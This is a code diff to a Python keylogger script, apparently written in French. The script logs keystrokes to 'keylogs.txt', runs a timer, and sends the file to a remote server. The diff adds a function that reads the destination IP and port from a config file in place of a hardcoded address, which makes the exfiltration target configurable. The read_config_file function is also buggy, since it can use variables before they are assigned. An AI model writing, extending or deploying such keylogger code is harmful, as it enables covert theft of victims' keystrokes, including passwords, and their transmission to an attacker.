@@ -7,6 +7,17 @@ import logging
   
 fin = False
 
+def read_config_file(filename):
+    with open(filename, 'r') as file:
+        for line in file:
+            if line.startswith("ip :"):
+                ip = line.split(":")[1].strip()
+            elif line.startswith("port :"):
+                port = line.split(":")[1].strip()
+            if ip and port:
+                break
+    return ip, port
+
 def on_press(key):
     logging.info(str(key))
  
@@ -39,11 +50,11 @@ def minuteur(dead):
         #     fin = True
         #     break
    
-    
+ip_value, port_value = read_config_file('config.txt')    
 threading.Thread(target=tracing,daemon=True).start()
 filename = "keylogs.txt" 
-server_address = "192.168.1.13"  # Adresse IP du serveur
-server_port = 6060  # Port du serveur
+server_address = ip_value
+server_port = port_value
 minuteur(10)
 send_file(filename, server_address, server_port)
 #os.remove(filename)
